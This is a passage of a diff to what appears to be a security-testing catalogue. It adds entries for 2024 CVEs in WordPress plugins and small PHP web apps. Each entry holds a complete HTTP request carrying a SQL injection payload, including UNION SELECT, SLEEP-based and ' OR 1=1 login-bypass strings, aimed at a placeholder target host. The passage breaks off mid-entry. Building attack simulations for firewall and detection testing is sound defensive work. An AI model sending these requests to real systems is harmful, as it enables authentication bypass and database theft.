@@ -273266,6 +273266,974 @@
     "visible": true
   },
   {
+    "name": "CVE-2024-0426 - ForU CMS SQL Injection",
+    "displayName": "CVE-2024-0426 - ForU CMS SQL Injection",
+    "description": "ForU CMS (up to 2020-06-23) is vulnerable to SQL injection in the admin/cms_template.php file via the t_name/t_path arguments (VulDB-named entry point). The request sends a UNION SELECT payload in the t_name parameter. HTTP method inferred as POST (template save/add form action); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the referenced PoC.\n\nReferences used to recreate this request:\n- https://github.com/mi2acle/forucmsvuln/blob/master/sqli.md (PoC, GitHub access blocked this session)\n- https://vuldb.com/?id.250445 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0426 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/cms_template.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nt_name=test%27+UNION+SELECT+1%2C2%2C3%2C4%2C5--+-&t_path=1\n"
+    },
+    "cves": [
+      "CVE-2024-0426"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0426",
+        "link": "https://github.com/mi2acle/forucmsvuln/blob/master/sqli.md"
+      },
+      {
+        "title": "vuldb for CVE-2024-0426",
+        "link": "https://vuldb.com/?id.250445"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0405 - Burst Statistics WordPress Plugin SQL Injection",
+    "displayName": "CVE-2024-0405 - Burst Statistics WordPress Plugin SQL Injection",
+    "description": "The Burst Statistics - Privacy-Friendly Analytics WordPress plugin 1.5.3 is vulnerable to authenticated (editor+) SQL injection via multiple JSON parameters of the /wp-json/burst/v1/data/compare REST endpoint (browser, device, page_id, page_url, platform, referrer). The request sends a UNION SELECT payload in the page_id JSON parameter. HTTP method inferred as POST with a JSON body (REST endpoint consuming JSON parameters); flagged as inferred. Nonce supplied as a dummy X-WP-Nonce header. Built from the Wordfence advisory and the fix changeset.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/e349f07d-a520-4700-a6e0-25e68c1deeae?source=cve (advisory)\n- https://plugins.trac.wordpress.org/changeset?new=3020809%40burst-statistics%2Ftrunk&old=3012004%40burst-statistics%2Ftrunk (fix changeset)\n- https://www.cve.org/CVERecord?id=CVE-2024-0405 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-json/burst/v1/data/compare HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\nX-WP-Nonce: dummy\nCookie: wordpress_logged_in_dummy=dummy\n\n{\"page_id\": \"1 UNION SELECT NULL,NULL,NULL-- -\", \"browser\": \"x\", \"device\": \"x\", \"page_url\": \"x\", \"platform\": \"x\", \"referrer\": \"x\"}\n"
+    },
+    "cves": [
+      "CVE-2024-0405"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-0405",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/e349f07d-a520-4700-a6e0-25e68c1deeae?source=cve"
+      },
+      {
+        "title": "fix_changeset for CVE-2024-0405",
+        "link": "https://plugins.trac.wordpress.org/changeset?new=3020809%40burst-statistics%2Ftrunk&old=3012004%40burst-statistics%2Ftrunk"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0399 - WooCommerce Customers Manager WordPress Plugin SQL Injection",
+    "displayName": "CVE-2024-0399 - WooCommerce Customers Manager WordPress Plugin SQL Injection",
+    "description": "The WooCommerce Customers Manager WordPress plugin before 29.7 is vulnerable to authenticated SQL injection through the max_amount_total parameter of the wccm_get_orders_tot_num AJAX action (POST /wp-admin/admin-ajax.php). The request sends a time-based SQL injection (AND SLEEP(5)) in max_amount_total, matching the WPScan PoC. Method and parameter confirmed from the WPScan advisory. Built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/1550e30c-bf80-48e0-bc51-67d29ebe7272/ (PoC and advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0399 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in_dummy=dummy\n\naction=wccm_get_orders_tot_num&max_amount_total=1+AND+SLEEP(5)&security=dummy\n"
+    },
+    "cves": [
+      "CVE-2024-0399"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2024-0399",
+        "link": "https://wpscan.com/vulnerability/1550e30c-bf80-48e0-bc51-67d29ebe7272/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0389 - SourceCodester Student Attendance System SQL Injection",
+    "displayName": "CVE-2024-0389 - SourceCodester Student Attendance System SQL Injection",
+    "description": "SourceCodester Student Attendance System 1.0 is vulnerable to SQL injection in attendance_report.php via the class_id argument (VulDB-named entry point). The request sends a time-based SQL injection (AND SLEEP(5)) in class_id. HTTP method inferred as GET (report/view parameter); flagged as inferred. No vendor WAF rule found; built from the VulDB description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.250230 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0389 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /attendance_report.php?class_id=1%20AND%20SLEEP(5) HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2024-0389"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2024-0389",
+        "link": "https://vuldb.com/?id.250230"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0365 - Fancy Product Designer WordPress Plugin SQL Injection",
+    "displayName": "CVE-2024-0365 - Fancy Product Designer WordPress Plugin SQL Injection",
+    "description": "The Fancy Product Designer WordPress plugin before 6.1.5 is vulnerable to authenticated SQL injection through the filter_by parameter of the fpd_get_products AJAX action (GET /wp-admin/admin-ajax.php). The request sends a time-based SQL injection (select ... sleep(5)) in filter_by, matching the WPScan PoC exactly. Method and parameter confirmed from the WPScan advisory. Nonce supplied as a dummy _ajax_nonce value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/4b8b9638-d52a-40bc-b298-ae1c74788c18/ (PoC and advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0365 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin-ajax.php?action=fpd_get_products&_ajax_nonce=dummy&filter_by=ID%2c(select*from(select(sleep(5)))a)&sort_by=ASC&page=1&type=catalog HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in_dummy=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2024-0365"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2024-0365",
+        "link": "https://wpscan.com/vulnerability/4b8b9638-d52a-40bc-b298-ae1c74788c18/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0364 - PHPGurukul Hospital Management System SQL Injection",
+    "displayName": "CVE-2024-0364 - PHPGurukul Hospital Management System SQL Injection",
+    "description": "PHPGurukul Hospital Management System 1.0 is vulnerable to SQL injection in admin/query-details.php via the adminremark argument (VulDB-named entry point). The request sends an SQL injection payload in the adminremark parameter. HTTP method inferred as POST (form submission field); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the referenced PoC.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL11.docx (PoC, GitHub access blocked this session)\n- https://vuldb.com/?id.250131 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0364 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/query-details.php?qid=1 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nadminremark=test%27+OR+1%3D1--+-&submit=submit\n"
+    },
+    "cves": [
+      "CVE-2024-0364"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0364",
+        "link": "https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL11.docx"
+      },
+      {
+        "title": "vuldb for CVE-2024-0364",
+        "link": "https://vuldb.com/?id.250131"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0363 - PHPGurukul Hospital Management System SQL Injection",
+    "displayName": "CVE-2024-0363 - PHPGurukul Hospital Management System SQL Injection",
+    "description": "PHPGurukul Hospital Management System 1.0 is vulnerable to SQL injection in admin/patient-search.php via the searchdata argument (VulDB-named entry point). The request sends an SQL injection payload in the searchdata parameter. HTTP method inferred as POST (form submission field); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the referenced PoC.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL10.docx (PoC, GitHub access blocked this session)\n- https://vuldb.com/?id.250130 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0363 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/patient-search.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsearchdata=test%27+OR+SLEEP(5)--+-&search=\n"
+    },
+    "cves": [
+      "CVE-2024-0363"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0363",
+        "link": "https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL10.docx"
+      },
+      {
+        "title": "vuldb for CVE-2024-0363",
+        "link": "https://vuldb.com/?id.250130"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0362 - PHPGurukul Hospital Management System SQL Injection",
+    "displayName": "CVE-2024-0362 - PHPGurukul Hospital Management System SQL Injection",
+    "description": "PHPGurukul Hospital Management System 1.0 is vulnerable to SQL injection in admin/change-password.php via the cpass argument (VulDB-named entry point). The request sends an SQL injection payload in the cpass parameter. HTTP method inferred as POST (form submission field); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the referenced PoC.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL8.docx (PoC, GitHub access blocked this session)\n- https://vuldb.com/?id.250129 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0362 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/change-password.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncpass=test%27+OR+1%3D1--+-&newpass=x&confirmpass=x&submit=submit\n"
+    },
+    "cves": [
+      "CVE-2024-0362"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0362",
+        "link": "https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL8.docx"
+      },
+      {
+        "title": "vuldb for CVE-2024-0362",
+        "link": "https://vuldb.com/?id.250129"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0361 - PHPGurukul Hospital Management System SQL Injection",
+    "displayName": "CVE-2024-0361 - PHPGurukul Hospital Management System SQL Injection",
+    "description": "PHPGurukul Hospital Management System 1.0 is vulnerable to SQL injection in admin/contact.php via the mobnum argument (VulDB-named entry point). The request sends an SQL injection payload in the mobnum parameter. HTTP method inferred as POST (form submission field); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the referenced PoC.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL7.docx (PoC, GitHub access blocked this session)\n- https://vuldb.com/?id.250128 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0361 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/contact.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\npagetitle=x&email=test%40test.com&mobnum=test%27+OR+1%3D1--+-&submit=update\n"
+    },
+    "cves": [
+      "CVE-2024-0361"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0361",
+        "link": "https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL7.docx"
+      },
+      {
+        "title": "vuldb for CVE-2024-0361",
+        "link": "https://vuldb.com/?id.250128"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0360 - PHPGurukul Hospital Management System SQL Injection",
+    "displayName": "CVE-2024-0360 - PHPGurukul Hospital Management System SQL Injection",
+    "description": "PHPGurukul Hospital Management System 1.0 is vulnerable to SQL injection in admin/edit-doctor-specialization.php via the doctorspecilization argument (VulDB-named entry point). The request sends an SQL injection payload in the doctorspecilization parameter. HTTP method inferred as POST (form submission field); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the referenced PoC.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL4.docx (PoC, GitHub access blocked this session)\n- https://vuldb.com/?id.250127 (VulDB entry, names file and argument)\n- https://www.cve.org/CVERecord?id=CVE-2024-0360 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/edit-doctor-specialization.php?spid=1 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ndoctorspecilization=test%27+OR+1%3D1--+-&submit=update\n"
+    },
+    "cves": [
+      "CVE-2024-0360"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0360",
+        "link": "https://github.com/laoquanshi/PHPGurukul-Hospital-Management-System/blob/main/PHPGurukul%20Hospital%20Management%20System%20SQL4.docx"
+      },
+      {
+        "title": "vuldb for CVE-2024-0360",
+        "link": "https://vuldb.com/?id.250127"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0359 - code-projects Simple Online Hotel Reservation System SQL Injection",
+    "displayName": "CVE-2024-0359 - code-projects Simple Online Hotel Reservation System SQL Injection",
+    "description": "code-projects Simple Online Hotel Reservation System 1.0 is vulnerable to SQL injection via the username/password arguments of login.php. The request sends a boolean-based authentication-bypass payload (' OR 1=1-- -) in the username field. HTTP method POST inferred (login form handler). No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/ZJQcicadawings/VulSql/blob/main/Simple%20Online%20Hotel%20Reservation%20System%20login.php%20has%20Sqlinjection.pdf (PoC)\n- https://vuldb.com/?id.250126 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0359 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+OR+1=1--+-&password=dummy\n"
+    },
+    "cves": [
+      "CVE-2024-0359"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0359",
+        "link": "https://github.com/ZJQcicadawings/VulSql/blob/main/Simple%20Online%20Hotel%20Reservation%20System%20login.php%20has%20Sqlinjection.pdf"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0359",
+        "link": "https://vuldb.com/?id.250126"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0357 - coderd-repos Eva SQL Injection",
+    "displayName": "CVE-2024-0357 - coderd-repos Eva SQL Injection",
+    "description": "coderd-repos Eva 1.0.0 is vulnerable to SQL injection via the 'property' argument handled by POST /system/traceLog/page. The 'property' value is used in an ORDER BY clause; the request sends a time-based SELECT SLEEP(5) sub-query payload. HTTP method POST is confirmed by the advisory (HTTP POST Request Handler); JSON request body format inferred (Spring Boot/MyBatis-Plus paged query). No vendor WAF rule found; built from the VulDB advisory and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/heishou/blob/main/eva%20sql.md (PoC)\n- https://vuldb.com/?id.250124 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0357 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /system/traceLog/page HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\n\n{\"property\":\"id,(SELECT 1 FROM (SELECT SLEEP(5))a)\",\"order\":\"asc\",\"current\":1,\"size\":10}\n"
+    },
+    "cves": [
+      "CVE-2024-0357"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0357",
+        "link": "https://github.com/laoquanshi/heishou/blob/main/eva%20sql.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0357",
+        "link": "https://vuldb.com/?id.250124"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0355 - PHPGurukul Dairy Farm Shop Management System SQL Injection",
+    "displayName": "CVE-2024-0355 - PHPGurukul Dairy Farm Shop Management System SQL Injection",
+    "description": "PHPGurukul Dairy Farm Shop Management System up to 1.1 is vulnerable to SQL injection via the 'category' argument of add-category.php. The request sends a boolean-based payload (' OR 1=1-- -) in the category field. HTTP method POST inferred (category add form handler). No vendor WAF rule found; built from the VulDB entry and write-up.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.250122 (VulDB advisory)\n- https://medium.com/@heishou/dfsms-has-sql-injection-vulnerability-e9cfbc375be8 (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2024-0355 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /add-category.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncategory='+OR+1=1--+-&submit=\n"
+    },
+    "cves": [
+      "CVE-2024-0355"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2024-0355",
+        "link": "https://vuldb.com/?id.250122"
+      },
+      {
+        "title": "writeup_medium for CVE-2024-0355",
+        "link": "https://medium.com/@heishou/dfsms-has-sql-injection-vulnerability-e9cfbc375be8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0344 - soxft TimeMail SQL Injection",
+    "displayName": "CVE-2024-0344 - soxft TimeMail SQL Injection",
+    "description": "soxft TimeMail up to 1.1 is vulnerable to SQL injection via the 'c' argument of check.php (the mail-confirmation code). The request sends a time-based payload (AND SLEEP(5)) in the c query parameter. HTTP method GET inferred (confirmation-link code parameter). No vendor WAF rule found; built from the VulDB entry and write-up.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.250112 (VulDB advisory)\n- https://note.zhaoj.in/share/VSutvlpgCJkD (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2024-0344 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /check.php?c=1'%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2024-0344"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2024-0344",
+        "link": "https://vuldb.com/?id.250112"
+      },
+      {
+        "title": "writeup_zhaoj for CVE-2024-0344",
+        "link": "https://note.zhaoj.in/share/VSutvlpgCJkD"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0307 - Kashipara Dynamic Lab Management System SQL Injection",
+    "displayName": "CVE-2024-0307 - Kashipara Dynamic Lab Management System SQL Injection",
+    "description": "Kashipara Dynamic Lab Management System up to 1.0 is vulnerable to SQL injection via the 'password' argument of login_process.php. The request sends a boolean-based authentication-bypass payload (' OR 1=1-- -) in the password field. HTTP method POST inferred (login form handler). No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/VistaAX/vulnerablility/blob/main/Dynamic%20Lab%20Management%20System%20-%20vuln%202.pdf (PoC)\n- https://vuldb.com/?id.249874 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0307 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login_process.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password='+OR+1=1--+-\n"
+    },
+    "cves": [
+      "CVE-2024-0307"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0307",
+        "link": "https://github.com/VistaAX/vulnerablility/blob/main/Dynamic%20Lab%20Management%20System%20-%20vuln%202.pdf"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0307",
+        "link": "https://vuldb.com/?id.249874"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0306 - Kashipara Dynamic Lab Management System SQL Injection",
+    "displayName": "CVE-2024-0306 - Kashipara Dynamic Lab Management System SQL Injection",
+    "description": "Kashipara Dynamic Lab Management System up to 1.0 is vulnerable to SQL injection via the 'admin_password' argument of /admin/admin_login_process.php. The request sends a boolean-based authentication-bypass payload (' OR 1=1-- -) in the admin_password field. HTTP method POST inferred (admin login form handler); companion admin_user field included for request shape. No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/E1CHO/cve_hub/blob/main/Dynamic%20Lab%20Management%20System%20-%20vuln%201.pdf (PoC)\n- https://vuldb.com/?id.249873 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0306 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/admin_login_process.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nadmin_user=admin&admin_password='+OR+1=1--+-\n"
+    },
+    "cves": [
+      "CVE-2024-0306"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2024-0306",
+        "link": "https://github.com/E1CHO/cve_hub/blob/main/Dynamic%20Lab%20Management%20System%20-%20vuln%201.pdf"
+      },
+      {
+        "title": "poc_vuldb for CVE-2024-0306",
+        "link": "https://vuldb.com/?id.249873"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2024-0290 - Kashipara Food Management System SQL Injection",
+    "displayName": "CVE-2024-0290 - Kashipara Food Management System SQL Injection",
+    "description": "Kashipara Food Management System 1.0 is vulnerable to SQL injection via the 'item_type' argument of stock_edit.php. The request sends a boolean-based payload (' OR 1=1-- -) in the item_type parameter. HTTP method GET inferred (edit page filter parameter). No vendor WAF rule found; built from the VulDB entry and PoC reference.\n\nReferences used to recreate this request:\n- https://github.com/laoquanshi/heishou/blob/main/Food%20Management%20System%20SQL%20Injection%20Vulnerability15.md (PoC)\n- https://vuldb.com/?id.249851 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2024-0290 (CVE record)",
+    "type": "webRequest",
